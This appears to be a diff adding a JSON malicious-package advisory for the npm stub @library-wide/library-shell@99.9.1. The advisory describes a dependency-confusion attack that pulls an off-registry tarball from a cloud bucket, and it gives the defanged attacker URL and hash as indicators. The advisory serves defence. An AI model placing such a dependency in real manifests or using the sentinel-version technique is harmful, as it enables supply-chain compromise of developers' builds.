@@ -1,0 +1,67 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12944",
+  "aliases": [
+    "MAL-2026-17754"
+  ],
+  "modified": "2026-10-12T01:00:57Z",
+  "published": "2026-10-10T09:34:38Z",
+  "summary": "Malicious code in @library-wide/library-shell (npm)",
+  "details": "@library-wide/library-shell@99.9.1 is an empty dependency-confusion stub. The published tarball contains only a two-line index.js (`module.exports = {}`) and a package.json with no lifecycle hooks, no bin entries and no functional code — but it declares a single dependency that is a raw tarball URL rather than a registry package: \"dependencies\": { \"ltidisafe\": \"hxxps://ltidi[.]storage[.]googleapis[.]com/depenconf/ltidisafe-3[.]8[.]4[.]tgz\" } Installing this package therefore fetches and installs code from an external Google Cloud Storage bucket (ltidi[.]storage[.]googleapis[.]com, path /depenconf/ltidisafe-3.8.4.tgz) instead of from the npm registry, bypassing the registry's audit trail, integrity metadata and provenance checks. The package name is scoped (@library-wide/...) and carries the sentinel version 99.9.1, the shape used to win version resolution against internal/private packages of the same scope so that a build resolving the scope silently pulls the external tarball. The stub itself executes nothing; the risk is the off-registry dependency it drags into the install. Analysis is manifest-level: the referenced tarball is not on the registry and its contents were not examined, so no claim is made about what it contains.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@library-wide/library-shell",
+        "purl": "pkg:npm/%40library-wide/library-shell"
+      },
+      "versions": [
+        "99.9.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-829",
+            "name": "Inclusion of Functionality from Untrusted Control Sphere"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@library-wide/library-shell/v/99.9.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12944"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "dependency_confusion",
+      "first_seen_at": "2026-10-10T09:34:38Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "ltidi[.]storage[.]googleapis[.]com"
+        ],
+        "sha256": [
+          "fb8fc998cb0700985255610425d186693c0afec10016468c39c5fa2bd1f772a3"
+        ],
+        "url_observed": [
+          "hxxps://ltidi[.]storage[.]googleapis[.]com/depenconf/ltidisafe-3[.]8[.]4[.]tgz"
+        ]
+      }
+    }
+  }
+}
